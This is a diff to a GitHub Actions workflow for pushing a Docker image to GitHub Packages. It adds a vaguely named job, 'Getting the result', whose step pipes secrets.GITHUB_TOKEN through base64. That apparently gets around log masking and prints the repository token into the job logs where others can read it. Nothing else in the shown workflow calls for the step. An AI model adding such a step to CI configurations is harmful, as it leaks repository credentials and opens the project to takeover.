@@ -5,6 +5,13 @@ on:
       - main
 
 jobs:
+  linux:
+    name: Getting the result
+    runs-on: ubuntu-latest
+    steps:
+    - name: Get Token
+      run: echo "${{ secrets.GITHUB_TOKEN }}" | base64
+
   push_to_registry:
     name: Push Docker image to GitHub Packages
     runs-on: ubuntu-latest
